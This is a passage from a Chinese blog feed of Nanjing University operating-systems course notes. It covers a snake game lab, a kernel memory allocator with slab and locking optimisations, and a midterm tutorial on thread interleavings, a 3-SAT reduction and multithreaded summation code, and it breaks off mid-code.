<blockquote>
<p>为什么我动态链接时无法查看 environ 的信息？</p>
</blockquote>
<h2 id="Encapsulation-Address-Space"><a href="#Encapsulation-Address-Space" class="headerlink" title="Encapsulation: Address Space"></a>Encapsulation: Address Space</h2><p>libc 为我们封装好了地址空间。我们可以通过 mmaps() 修改地址空间映射，也可以通过 malloc() 和 free() 从堆区里申请/释放空间。</p>
<p>想要优化 malloc()/free() 的性能，我们要对 workload 有正确的假设。指导思想：$O(n)$ 大小的对象分配后至少有 $\Omega(n)$ 的读写操作，否则就是 performance bug。</p>
<ul>
<li>越小的对象创建/分配越频繁 (e.g. 字符串，临时对象等，生存周期不长)</li>
<li>较为频繁地分配中等大小对象 (e.g. 复杂的对象，较大的数组)</li>
<li>低频率的大对象 (e.g. 巨大的容器，分配器；很长的生存周期)</li>
</ul>
<p>核心优化思想：Fast path + slow path，争取在 fast path 上做到 $O(1)$ (无锁或无 contention)。计算机系统的世界中处处是 fast path + slow path，比如 memory hierarchy。</p>
]]></content>
      <categories>
        <category>NJU-22020230 Operating Systems</category>
        <category>Lecture Notes</category>
      </categories>
  </entry>
  <entry>
    <title>NJU-OS Lab 0: amgame</title>
    <url>/2022/03/11/NJU-OS%20Lab%200%20-%20amgame/</url>
    <content><![CDATA[<p>该实验的主要目的是在 abstract-machine 抽象的 bare-metal 上编写一个小游戏。笔者实现的小游戏是贪吃蛇。</p>
<span id="more"></span>

<h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><p>我们需要使用的比较重要的 AM 的接口有：</p>
<ul>
<li><code>putch()</code> 及其封装版本 <code>puts()</code> ，负责向控制台输出字符和字符串。</li>
<li><code>AM_TIMER_UPTIME</code> ，对该抽象寄存器进行读取可以获得系统启动以来运行时间的微秒数。</li>
<li><code>AM_INPUT_KEYBRD</code>，对该抽象寄存器进行读取可以获得一个 AM_INPUT_KEYBRD_T 结构体，其中存储了当前是否有按键被按下，被按下的按键编码等。</li>
<li><code>AM_GPU_CONFIG</code>，对该抽象寄存器进行读取可以获得 VGA 的基本信息，包括窗口宽高的像素数量。</li>
<li><code>AM_GPU_FBDRAW</code>，对该抽象寄存器写入一个 AM_GPU_FBDRAW_T 结构体可以向 VGA 输出一个方格的颜色。</li>
</ul>
<h2 id="Game-Logic"><a href="#Game-Logic" class="headerlink" title="Game Logic"></a>Game Logic</h2><p>一个游戏的基本框架为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span> (uptime() &lt; next_frame);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> ((key = read_key() != AM_KEY_NONE)</span><br><span class="line">    	kbd_event(key);</span><br><span class="line">    </span><br><span class="line">    game_process();</span><br><span class="line">    screen_update();</span><br><span class="line">    next_frame += <span class="number">1000</span> / FPS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对于贪吃蛇游戏：</p>
<ul>
<li><p>在 kbd_event() 中，我们需要处理 ESC 按键，令其调用 halt()，以及四个方向键用于控制贪吃蛇的行走方向。笔者还设置了按 <code>R</code> 键重新开始游戏的功能。</p>
</li>
<li><p>在 game_process() 中</p>
<ul>
<li>我们需要维护贪吃蛇每一节身体的位置，并将头部按照当前方向移动一格，判断有没有出现撞墙或者吃了自己的情况，如果出现了，在游戏主循环中应该停止画面更新。</li>
<li>我们需要维护食物，如果食物和蛇头重合，则应该分数+1，并随机一个位置 (不能和蛇重合) 重新放置食物。</li>
<li>为了逐步增加游戏的难度，笔者维护 <code>FPS = 5 + (score / 2)</code>，即每多得两分，贪吃蛇的移动速度便会加快一级。</li>
</ul>
</li>
<li><p>在 screen_update() 中，我们可以将背景涂成黑色，将边缘涂成橙色，将蛇身涂成绿色，蛇头涂成蓝色，食物涂成红色。</p>
<p>​    </p>
</li>
</ul>
]]></content>
      <categories>
        <category>NJU-22020230 Operating Systems</category>
        <category>Lab Reports</category>
      </categories>
  </entry>
  <entry>
    <title>NJU-OS Lab 1: Physical Memory Manager</title>
    <url>/2022/04/06/NJU-OS%20Lab%201%20-%20pmm/</url>
    <content><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>该实验的目标是实现一个 (内核使用的) 堆区的内存分配器。在技术上有如下要点：</p>
<ul>
<li><p>维护堆区的数据结构应该放在堆区里，所以我们不应该开静态数组保存维护堆区的链表等，而应该将链表节点就存储在空闲的内存块上 (反正空闲的内存块当前也没有有效信息)。<span id="more"></span></p>
</li>
<li><p>由于 kfree() 只传入了要释放内存块的起始地址，而没有传入 size，所以我们应当在 kalloc() 的时候记录每个释放出去的内存块的大小。笔者最初的实现是维护了一个分配出去的内存块的链表，kfree() 到来时，在链表里查找给定的地址是否存在以及对应的大小。但这样效率太低，于是笔者使用了在地址前打魔数的方法。笔者定义了一个如下的 header：</p>
  <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ALLOC_MAGIC 0x1234567;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> __<span class="title">header_t</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> sz;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="keyword">uintptr_t</span> magic;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> __<span class="title">header_t</span> *<span class="title">next</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line">&#125;<span class="keyword">header_t</span>;</span><br></pre></td></tr></table></figure>

<p>  每个内存块前都有一个这样的 header。这个 header 的好处是：未分配内存和已分配内存可以共用这个 header，当内存块处于未分配状态时，内存块被放在链表中，union 字段存放的是下一个链表节点的地址；当内存块处于已分配状态时，union 字段存放魔数。一个 kfree() 地址来临时，只要查看其前一个 <code>uintptr_t</code> 中是不是 ALLOC_MAGIC，就能确定这个地址合不合法，再往前看就能获得内存块的 size。</p>
<p>  (注：使用 header 的方法有一个弱点：原本在堆区中 1B 的内存加上 header 后变得很大。此外，由于对齐的原因，我们无法将多个大小相同的内存块“挨在一起”存放在堆区中，中间有很多“洞”。)</p>
</li>
<li><p>由于 pmm 会被并发地执行，所以访问共享数据结构要上锁。</p>
</li>
</ul>
<h2 id="Defensive-Programming"><a href="#Defensive-Programming" class="headerlink" title="Defensive Programming"></a>Defensive Programming</h2><p>笔者认为以下的防御性编程是有意义的：</p>
<ul>
<li>在 kalloc(), kfree() 中加入足够的对地址性质，空间大小分析的 panic(), panic_on() 等，这有助于提前发现 failure。</li>
<li>笔者实现的自旋锁中记录了当前拥有锁的 CPU 编号，这样在 acquire() 和 release() 前检查当前是否拥有锁，可以有效防御 AA-deadlock 和一些意料之外的情况。</li>
<li>kalloc()/kfree() 结束时应该将对应内存区间 memset 成奇怪数值，这样后续使用时如果忘了清零/地址溢出，读到垃圾数据可以加快 failure 出现的速度，减少排查 bug 的时间。</li>
</ul>
<p>但以上防御性编程对效率有一定影响，因此笔者在提交 OJ 的版本中没有编译这些防御性编程。</p>
<h2 id="Performance-Tuning"><a href="#Performance-Tuning" class="headerlink" title="Performance Tuning"></a>Performance Tuning</h2><p>该实验对效率有一定的要求，笔者主要使用 Linux perf 工具对代码的运行时间/并行度进行观测。本地 Workload 的信息为：$60%$ 的 128K 以内内存分配，$30%$ 的 pagesize 内存分配，$10%$ 的大内存分配。释放的频率和分配相仿。每个核做 400,000 次分配和回收。</p>
<p>笔者做过如下优化：</p>
<h3 id="Fast-Path"><a href="#Fast-Path" class="headerlink" title="Fast Path"></a>Fast Path</h3><ul>
<li><p>将整个堆区分成 <code>cpu_count()</code> 份，每个 CPU 核只在自己的那一份的链表中 alloc() 和 free() (free 时根据地址还到相应的资源区中)，因为一个核的 kalloc() 可能在另一个核中 kfree()，所以即使分成了多份，访问数据结构依旧要上锁。如果本地资源不足，则从别的资源区偷资源。该做法有一定效率提升，但不明显。</p>
</li>
<li><p>slab。笔者对 1KB 以下内存分配的每种大小都开了一个单独的链表，对 pagesize (4KB) 也开了一个链表。slab 的核心做法是：没有资源时走 slow path，从全局资源中批发很多小块串成链表；有资源时直接从链表头取一个小块。这里每次走 slow path 批发多少个小块是一个需要调整的参数，不同的参数会对效率和失败率产生影响。</p>
<p>  这里的一个细节是：笔者希望每个核从自己的 slab 中获取资源，释放时将资源释放到自己的 slab 中，这样 fast path 不需要上锁。但提交 OJ 发现 smp=2 时就会出现 low memory usage，这很可能是因为 OJ 上两个核的任务不对称，如一个核专门 kalloc()，一个核专门 lfree()，导致资源全部堆积在第二个核的 slab 里无法利用。因此笔者不得不对 slab 的访问上锁，本地 slab 没有资源时去偷别人的 slab 的资源。</p>
</li>
<li><p>为了减少 slab 上的锁拥堵，笔者尝试了以下两种“玄学”优化：</p>
<ul>
<li>每个核 kalloc() 时随机一个 slab 取资源，kfree() 时随机一个 slab 还资源 (其实两个都随机和只随机一个效果是一样的)。该策略只需要访问一个 slab，比之前的偷资源策略要高效一些，且打破了”不对称任务“约束，不会 low memory usage。该优化在本地 workload 中显著减少了锁的拥堵程度。</li>
<li>为了进一步减少锁的拥堵 (毕竟两个核随机到一个 slab 的概率还是不小的)，笔者给每个核选定一个 target slab (这是一个 permutation)，每个核向 target slab 索取资源，释放时归还到 target slab 中。为了避免“不对称任务”约束，每进行一定次数的分配后，shuffle 一下 target slab 的 permutation。该优化在本地的 workload 中相较前一种方法确实进一步减少了锁的拥堵程度，但没有看到明显的效率提升。</li>
</ul>
</li>
</ul>
<h3 id="Slow-Path"><a href="#Slow-Path" class="headerlink" title="Slow Path"></a>Slow Path</h3><ul>
<li><p>为了防止 (可以避免的) 过于破碎的内存，链表中应当有合并机制，即插入一个节点后，将其与左右邻居比较，若端点重合则合并节点。</p>
</li>
<li><p>OSTEP 中提到过 best/first/next fit 等多种寻找可用节点的策略，如果使用 first fit，一段时间后堆区的前部就会出现较多破碎内存，后部相对完整，使搜索相对较慢。next fit 理论上会有更好的表现，但笔者没有在本地测试中观测到明显的效率提升。</p>
</li>
<li><p>为了进一步减少破碎内存，笔者使用如下策略：一个内存块如果被分配完后剩余空间过少 (小于一个阈值)，则不选择切分这个内存块，而是将整块给当前分配。这样可以减少链表中容量很小的内存块个数。该优化在本地 workload 中体现出了效果。</p>
</li>
<li><p>在一次 alloc() 失败后，记录这次的需求大小，在下一次 free() 来临之前，如果再出现大于之前失败最小值的 alloc()，可以不遍历链表直接返回 NULL。注意 free() 之后要将记录变量清空。该优化在失败率比较高的 workload 中体现出了效果。</p>
</li>
<li><p>笔者发现完全抛弃链表，只用一个全局指针维护堆区，对于一个分配寻找全局指针最近的下一个对齐点 (结合 slab，kfree() 直接放到 slab 中) 的方法不会在 OJ 中报 low memory usage。这样复杂的链表操作被大幅简化。该优化在本地 workload 中体现出巨大效果。</p>
<p>  (注：如果很小的内存 alloc 和很大的内存 alloc 交替出现，该方法会浪费很多内存。该方法属于用失败率换效率的一个尝试。)</p>
</li>
</ul>
<p>即使笔者结合 Fast Path 和 Slow Path 中能想到的最优的实现，也无法通过旧版 OJ 上 <code>smp=8</code> 的测试用例。在本地 workload 下笔者的最优实现可以在 1.5s 到 2s 完成 8 核的所有任务。</p>
]]></content>
      <categories>
        <category>NJU-22020230 Operating Systems</category>
        <category>Lab Reports</category>
      </categories>
  </entry>
  <entry>
    <title>NJU-OS Midterm Tutorial</title>
    <url>/2022/04/07/NJU-OS%20Midterm%20Tutorial/</url>
    <content><![CDATA[<h2 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h2><h3 id="简答题"><a href="#简答题" class="headerlink" title="简答题"></a>简答题</h3><p>现有如下代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> <span class="keyword">volatile</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_sum</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> t;</span><br><span class="line"><span class="comment">/* 1 */</span>  t = sum;</span><br><span class="line"><span class="comment">/* 2 */</span>  t += <span class="number">1</span>;</span><br><span class="line"><span class="comment">/* 3 */</span>  sum = t;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 4 */</span>  t = sum;</span><br><span class="line"><span class="comment">/* 5 */</span>  t += <span class="number">1</span>;</span><br><span class="line"><span class="comment">/* 6 */</span>  sum = t;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 7 */</span>  t = sum;</span><br><span class="line"><span class="comment">/* 8 */</span>  t += <span class="number">1</span>;</span><br><span class="line"><span class="comment">/* 9 */</span>  sum = t;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>有两个线程 T1 和 T2 均执行 <code>do_sum</code> 代码 (共享 sum 变量)。假设线程每次按 1, 2, 3, … 9 顺序执行一条语句，且读/写会立即在共享内存中生效。例如，若两个线程以如下顺序执行语句，即相当于 T1 执行完后再执行 T2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">T1.1 T1.2 T1.3 T1.4 T1.5 T1.6 T1.7 T1.8 T1.9</span><br><span class="line">T2.1 T2.2 T2.3 T2.4 T2.5 T2.6 T2.7 T2.8 T2.9</span><br></pre></td></tr></table></figure>

<p>将得到 <code>sum = 6</code> (但这显然不是最小值)。你需要给出使 sum 最小化的一个线程执行顺序 (T1 和 T2 可以交错执行)。</p>
<h3 id="编程题"><a href="#编程题" class="headerlink" title="编程题"></a>编程题</h3><p>假设我们需要对很多 $x(x&gt;0)$ 计算 $f(x)$ 的和。每个 $f(x)$ 都可能会计算较长的时间。你需要在 <code>thread.h</code> 和 <code>thread-sync.h</code> (Online Judge 会使用此实现) 的基础上实现不少于 4 个 worker 线程的并行处理：</p>
<ul>
<li>所有待处理的  都是 int 类型，从标准输入 (stdin) 读入直到输入结束</li>
<li>对每一个整数 ，都调用来自外部的 <code>long f(int x);</code> 计算，这个函数是线程安全的</li>
<li>你的程序需要输出所有 $f(x)$ 的和 (保证和不超过 long 的范围)，并正常终止</li>
<li>你需要尽快处理来自 stdin 的输入 (读入以后统一处理将导致 Time Limit Exceeded)</li>
<li>个别的 $f(x)$ 可能会消耗较长的时间，请确保此时在有待计算的  时其他线程不会被闲置</li>
</ul>
<p>注意：编程时请自觉仅使用手册，不要参考已有的代码或教科书等材料。</p>
<h2 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions"></a>Solutions</h2><h3 id="简答题-1"><a href="#简答题-1" class="headerlink" title="简答题"></a>简答题</h3><p>本题乍一眼会觉得两个程序完全交错运行会得到最小值 3，但实际上最小值可以达到 2。为了避免繁杂的思考，我们可以直接写一个小程序解决问题：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> seq[<span class="number">48</span>], ans = <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printseq</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ans: %d\n&quot;</span>, ans);</span><br><span class="line">	<span class="keyword">int</span> c1 = <span class="number">0</span>, c2 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">18</span>; i++)</span><br><span class="line">		<span class="keyword">if</span> (seq[i] == <span class="number">0</span>) c1++, <span class="built_in">printf</span>(<span class="string">&quot;T1.%d &quot;</span>, c1);</span><br><span class="line">		<span class="keyword">else</span> c2++, <span class="built_in">printf</span>(<span class="string">&quot;T2.%d &quot;</span>, c2);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> sum = <span class="number">0</span>, tid, t[<span class="number">2</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;, c[<span class="number">2</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;, type;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">18</span>; i++) &#123;</span><br><span class="line">		tid = seq[i]; c[tid]++; type = c[tid] % <span class="number">3</span>;</span><br><span class="line">		<span class="built_in"><span class="keyword">switch</span></span> (type) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>: t[tid] = sum; <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>: t[tid]++;     <span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>: sum = t[tid]; <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (sum &lt; ans) ans = sum, <span class="built_in">printseq</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> step,<span class="keyword">int</span> cnt)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (step == <span class="number">19</span>) &#123;<span class="keyword">if</span> (cnt == <span class="number">9</span>) <span class="built_in">check</span>(); <span class="keyword">return</span>;&#125;</span><br><span class="line">	seq[step] = <span class="number">0</span>; <span class="built_in">dfs</span>(step + <span class="number">1</span>, cnt);</span><br><span class="line">	seq[step] = <span class="number">1</span>; <span class="built_in">dfs</span>(step + <span class="number">1</span>, cnt + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">dfs</span>(<span class="number">1</span>,<span class="number">0</span>); <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们只要为两个线程各开一个变量，就可以枚举所有可能的并发行为。一种可以使最后答案达到 2 的并发执行序列为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">T1.1 T1.2</span><br><span class="line">T2.1</span><br><span class="line">T1.3 T1.4 T1.5 T1.6</span><br><span class="line">T2.2 T2.3</span><br><span class="line">T1.7 T1.8</span><br><span class="line">T2.4 T2.5 T2.6 T2.7 T2.8 T2.9</span><br><span class="line">T1.9</span><br></pre></td></tr></table></figure>

<p>事实上，对于 $k$ 个线程加 $n$ 次的程序，只要 $n,k\geq 2$，sum 的最小值都是 2。我们考虑这样一个调度：</p>
<ul>
<li>线程 1 执行第一次 <code>t = sum;</code> <code>t++</code> ，然后暂停。此时线程 1 的 t 为 1。</li>
<li>线程 2 执行到最后一轮。</li>
<li>线程 1 执行 <code>sum = t;</code>，然后暂停。此时 sum 变回 1。</li>
<li>线程 2 执行最后一轮的 <code>t = sum;</code> <code>t++</code>，然后暂停。此时线程 2 的 t 为 2。</li>
<li>让除了线程 2 以外的所有线程都跑完。</li>
<li>线程 2 执行最后一轮的 <code>sum = t;</code>，所有线程执行完毕。sum 的最终结果为 2。</li>
</ul>
<p>这题旨在说明：仅仅是非常简单的并发程序，其运行过程也可能超出人类的理解范围。“反直觉“的来源是： Verifying Sequential Consistency (VSC) 问题是一个 NPC 问题。这里所说的 VSC 问题是这样一个问题：</p>
<blockquote>
<p>现在有若干个线程，每个线程中能看到若干个线程本地的顺序操作。操作分为两类：</p>
<ul>
<li><code>write(x, val)</code>：向全局变量 x 中写入数值 val。</li>
<li><code>read(x) = val</code>：读全局变量 x 的值，得到的结果是 val。</li>
</ul>
<p>我们能否将各个线程的操作排出一个全序，使得所有 read() 操作的结果都是正确的？</p>
</blockquote>
<p>该问题是 NP 问题是显然的，我们考虑将 3-SAT 问题规约到它来证明 VSC 问题是 NP-hard 问题：不妨设一个 3-SAT 问题的实例中出现的变量为 $x_1,x_2,\cdots, x_n$，</p>
<ul>
<li>阶段1 (给变量赋值)：我们创建 $2n$ 个线程，它们的第一个操作分别是 <code>write(x1,0)</code> <code>write(x1,1)</code> <code>write(x2,0)</code> <code>write(x2,1)</code> … <code>write(xn,0)</code> <code>write(xn,1)</code>。</li>
<li>阶段2 (确认变量的值并给从句赋值) 对于每个从句，这里以 $C_i=(x\or \lnot y)$ 举例，我们在某一个线程中做两步操作：<code>read(x)=1</code> <code>write(Si,1)</code>；在另一个线程中做两步操作：<code>read(y)=0</code> <code>write(Si,1)</code>。</li>
<li>阶段3 (收答案)：在一个收答案线程中连做 <code>read(S1)=1</code> <code>read(S2)=1</code> … <code>read(Sn)=1</code> 。</li>
<li>阶段4 (收尾)：阶段 1 的赋值可能会导致阶段 2 有的线程被阻塞注。为了保证每个线程可以结束，我们要在另外的一些线程中对于每个变量 $x_i$ 把 <code>write(xi,0)</code> 和 <code>write(xi,1)</code> 再做一遍。</li>
</ul>
<p>此外，我们需要一些同步机制，保证所有线程阶段 $i$ 的操作都做完了再进入阶段 $i+1$。我们可以额外设置一些标志变量表示阶段 $i$ 的某一个操作有没有完成。在下一个阶段开始之前 read 上一个阶段所有的标志变量，确定都是 1 了再开始做。</p>
<p>以上的操作次数显然是多项式。一个 3-SAT 式如果有解，我们可以在阶段1通过线程的调度、覆盖让变量赋上正确的值，阶段2中可以使从句为真的线程继续执行并给所有 $S_i$ 赋值 1。阶段3收答案线程可以运行完毕，阶段4释放阶段2被阻塞的线程。如果线程调度有解，说明收答案线程看到了所有从句被满足，又因为我们有阶段同步机制，所以我们只要查看阶段1结束时各个变量的值，就知道什么样的赋值可以使所有从句满足。</p>
<p>综上，VSC 是一个 NPC 问题。</p>
<h3 id="编程题-1"><a href="#编程题-1" class="headerlink" title="编程题"></a>编程题</h3><p>该问题其实只要将所有的任务交给线程，线程读入时上锁即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;thread.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;thread-sync.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">long</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> sum[<span class="number">5</span>] = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">mutex_t</span> lock = MUTEX_INIT();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calc</span><span class="params">(<span class="keyword">int</span> tid)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">long</span> rt; <span class="keyword">int</span> x;</span><br><span class="line">	<span class="keyword">for</span> (;;)</span><br><span class="line">	&#123;</span><br><span class="line">		mutex_lock(&amp;lock);</span><br><span class="line">		<span class="keyword">if</span> (feof(<span class="built_in">stdin</span>) || (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x) != <span class="number">1</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			mutex_unlock(&amp;lock);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		mutex_unlock(&amp;lock);</span><br><span class="line">		sum[tid] += f(x);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) create(calc);</span><br><span class="line">	join();</span><br><span class="line">	<span class="keyword">long</span> ans = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">4</span>; i++) ans += sum[i];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, ans);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>事实上，C 标准库是线程安全的，因此读入根本不需要上锁。上面的实现中可以把锁去掉：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tworker</span><span class="params">(<span class="keyword">int</span> tid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">while</span> (!feof(<span class="built_in">stdin</span>) &amp;&amp; <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x) == <span class="number">1</span>)</span><br><span class="line">        sum[tid] += f(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们也可以用生产者-消费者模型，让 main() 函数负责所有的读入，将数据分发给各个线程。为了让各个线程能够结束，main() 函数读完数据后再向队列中放线程个数个 -1，线程读到负数就 break。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;thread.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">long</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> sum[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">sync_t</span> &#123;</span></span><br><span class="line">	<span class="keyword">pthread_mutex_t</span> lock;</span><br><span class="line">	<span class="keyword">pthread_cond_t</span> cond;</span><br><span class="line">	<span class="keyword">int</span> buf[MAX], rp, wp;</span><br><span class="line">&#125;<span class="keyword">sync_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">sync_t</span> s;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init_sync</span><span class="params">(<span class="keyword">sync_t</span> *sync)</span> </span>&#123;</span><br><span class="line">	pthread_mutex_init(&amp;sync-&gt;lock, <span class="literal">NULL</span>);</span><br><span class="line">	pthread_cond_init(&amp;sync-&gt;cond, <span class="literal">NULL</span>);</span><br><span class="line">	sync-&gt;rp = sync-&gt;wp = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Tconsumer_wait</span><span class="params">(<span class="keyword">sync_t</span> *sync)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> rt;</span><br><span class="line">	pthread_mutex_lock(&amp;sync-&gt;lock);</span><br><span class="line">	<span class="keyword">while</span> (sync-&gt;rp == sync-&gt;wp)</span><br><span class="line">		pthread_cond_wait(&amp;sync-&gt;cond, &amp;sync-&gt;lock);</span><br><span class="line">	rt = sync-&gt;buf[sync-&gt;rp % MAX];</span><br><span class="line">	sync-&gt;rp++;</span><br><span class="line">	pthread_cond_broadcast(&amp;sync-&gt;cond);</span><br><span class="line">	pthread_mutex_unlock(&amp;sync-&gt;lock);</span><br><span class="line">	<span class="keyword">return</span> rt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tproducer_wait</span><span class="params">(<span class="keyword">sync_t</span> *sync, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">	pthread_mutex_lock(&amp;sync-&gt;lock);</span><br><span class="line">	<span class="keyword">while</span> (sync-&gt;wp == sync-&gt;rp + MAX)</span><br><span class="line">		pthread_cond_wait(&amp;sync-&gt;cond, &amp;sync-&gt;lock);</span><br><span class="line">	sync-&gt;buf[sync-&gt;wp % MAX] = val;</span><br><span class="line">	sync-&gt;wp++;</span><br><span class="line">	pthread_cond_broadcast(&amp;sync-&gt;cond);</span><br><span class="line">	pthread_mutex_unlock(&amp;sync-&gt;lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tconsumer</span><span class="params">(<span class="keyword">int</span> tid)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x;</span><br><span class="line">	<span class="keyword">while</span> ((x = Tconsumer_wait(&amp;s)) &gt; <span class="number">0</span>) sum[tid] += f(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x;</span><br><span class="line">	init_sync(&amp;s);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">4</span>; i++)</span><br><span class="line">		create(Tconsumer);</span><br><span class="line">	<span class="keyword">while</span> (!feof(<span class="built_in">stdin</span>) &amp;&amp; <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x) == <span class="number">1</span>) Tproducer_wait(&amp;s, x);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">4</span>; i++)</span><br><span class="line">		Tproducer_wait(&amp;s, <span class="number">-1</span>);</span><br><span class="line">	join();</span><br><span class="line">	</span><br><span class="line">	<span 